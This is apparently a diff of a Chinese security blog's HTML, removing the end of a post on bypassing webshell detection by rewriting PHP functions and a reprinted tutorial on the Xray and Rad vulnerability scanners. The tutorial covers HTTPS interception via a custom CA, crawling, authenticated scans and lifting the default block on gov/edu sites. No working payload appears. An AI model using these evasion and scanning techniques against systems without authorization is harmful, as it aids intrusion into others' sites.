</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Webshell-Bypass/15.png" alt="image"></p>
-<p>这里只介绍了重写substr函数 那么其他的函数可以吗 当然可以</p>
-</blockquote>
-<h3><span id="0x04写在后面">0x04：写在后面</span></h3><blockquote>
-<p>只要思想不滑坡 方法总比困难多</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Webshell/" rel="tag">Webshell</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/Xray-Rad/">
-                Xray、Rad两款工具的使用与联动
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="xray-rad两款工具的使用与联动">Xray、Rad两款工具的使用与联动</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1140037586/article/details/128316160">夏初春末_昊</a> 并作补充</p>
-</blockquote>
-<h3><span id="1-xray的简介">1、Xray的简介</span></h3><blockquote>
-<p><strong>xray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，主要特性有:</strong></p>
-<p>1、检测速度快。发包速度快; 漏洞检测算法效率高。<br>2、支持范围广。大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。<br>3、代码质量高。编写代码的人员素质高, 通过 Code Review、单元测试、集成测试等多层验证来提高代码可靠性。<br>4、高级可定制。通过配置文件暴露了引擎的各种参数，通过修改配置文件可以客制化功能。<br>5、安全无威胁。xray 定位为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和 poc 均为无害化检查。<br>这是Xray的官方教程<a target="_blank" rel="noopener" href="https://docs.xray.cool/#/">https://docs.xray.cool/#/</a></p>
-</blockquote>
-<h3><span id="2-xray的使用">2、Xray的使用</span></h3><h4><span id="21-下载xray">2.1、下载Xray</span></h4><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a></p>
-</blockquote>
-<h4><span id="22-使用powershell进入到下载解压的目录">2.2、使用powershell进入到下载解压的目录</span></h4><blockquote>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\Xray.exe --运行xray</span><br><span class="line">.\Xray.exe version  --查看版本号</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4><span id="23-使用-xray-代理模式进行漏洞扫描">2.3、使用 xray 代理模式进行漏洞扫描</span></h4><blockquote>
-<p>（1）代理模式下，扫描器作为中间人，首先原样转发流量，并返回服务器响应给浏览器等客户端，通讯两端都认为自己直接与对方对话，同时记录该流量，然后修改参数并重新发送请求进行扫描。<br>（2）在浏览器使用 https 协议通信的情况下，必须要得到客户端的信任，才能建立与客户端的通信。这里的突破口就是 ca 证书。只要自定义的 ca 证书得到了客户端的信任，xray 就能用该 ca 证书签发各种伪造的服务器证书，从而获取到通信内容。</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_darwin_amd64 genca --生成ca证书</span><br></pre></td></tr></table></figure>
-
-<p>双击 ca.crt，将证书导入到受信任的目录</p>
-<p><img src="/2024/01/19/Xray-Rad/1.png" alt="image"></p>
-<p>（3）xray 配置文件中默认不允许扫描 gov 和 edu 等网站，如果想对这些网站进行授权测试，需要移除 config.yml中的hostname_disallowed 的相关配置。</p>
-</blockquote>
-<h4><span id="24-开始扫描">2.4、开始扫描</span></h4><blockquote>
-<p>使用powershell执行如下命令</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./xray.exe webscan --listen <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">7777</span> --html-output xray-scan.html  ---启动监听</span><br><span class="line">./xray.exe webscan --url-file edu.txt --html-output edu.html</span><br></pre></td></tr></table></figure>
-
-<p>（1）启动监听之后，浏览器开启127.0.0.1&#x2F;7777的代理<br>（2）浏览器访问网页就行，xray会自动进行扫描</p>
-</blockquote>
-<h4><span id="25-使用-xray-基础爬虫模式进行漏洞扫描">2.5、使用 xray 基础爬虫模式进行漏洞扫描</span></h4><blockquote>
-<p>（1）爬虫模式是模拟人工去点击网页的链接，然后去分析扫描，和代理模式不同的是，爬虫不需要人工的介入，访问速度要快很多<br>.&#x2F;xray.exe webscan –basic-crawler <a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/sqli/sqli_str.php">http://127.0.0.1/pikachu/vul/sqli/sqli_str.php</a> –html-output pachong_pikachu.html<br>（2）登录后的网站扫描。如果用的是代理模式，只要浏览器是登录状态，那么漏洞扫描收到的请求也都是登录状态的请求。对于普通爬虫而言，就没有这么“自动化”了， 可以通过配置 Cookie 的方式实现登录后的扫描。打开配置文件，修改 http 配置部分的 Headers 项:（配置文件修改）</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>:</span><br><span class="line">  headers:</span><br><span class="line">    Cookie: key=value</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4><span id="26-漏洞扫描时使用代理配置文件修改">2.6、漏洞扫描时使用代理（配置文件修改）</span></h4><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy:&quot;	&quot;	# 漏洞扫描时使用的代理，如: http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="3-rad简介">3、Rad简介</span></h3><blockquote>
-<p>Rad是长亭科技开发的一款目录爬取工具，因为xray自动化爬取功能欠佳，所以结合rad可以更高效的自动爬取。注意，rad只是爬取目标的目录，不爬取子域！！</p>
-</blockquote>
-<h4><span id="31-下载rad">3.1、下载Rad</span></h4><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/chaitin/rad/releases">https://github.com/chaitin/rad/releases</a></p>
-</blockquote>
-<h4><span id="32-rad的使用">3.2、Rad的使用</span></h4><blockquote>
-<p>下载好后进入解压的目录，执行如下命令进行使用</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rad -t http://example.com</span><br><span class="line">需要手动登录的情况</span><br><span class="line"></span><br><span class="line">rad -t http://example.com -wait-login</span><br><span class="line">执行以上命令会自动禁用无头浏览模式，开启一个浏览器供手动登录。 在登录完毕后在命令行界面点击回车键继续爬取。</span><br><span class="line"></span><br><span class="line">rad -t http://example.com -text-output vuln.txt</span><br><span class="line">以上命令会将爬取到的URL输出到vuln.txt中</span><br><span class="line"></span><br><span class="line">导出完整请求</span><br><span class="line">rad -t http://example.com -full-text-output result.txt</span><br><span class="line"></span><br><span class="line">完美使用语法如下</span><br><span class="line">rad_windows_amd64.exe -t http://example.com -text-output vuln.txt  -wait-login</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="4-xray与rad联动">4、Xray与Rad联动</span></h3><h4><span id="41-radxray高效扫描">4.1、rad+xray高效扫描</span></h4><blockquote>
-<p>（1）xray开启代理监听</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray.exe  webscan --listen <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">7777</span> --html-output proxy.html </span><br></pre></td></tr></table></figure>
-
-<p>（2）rad对目标进行爬取，代理到xray上</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rad -t http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/pikachu/ -http-proxy <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">7777</span>  -wait-login</span><br></pre></td></tr></table></figure>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Rad/" rel="tag">Rad</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Xray/" rel="tag">Xray</a>
             </div>
         
 
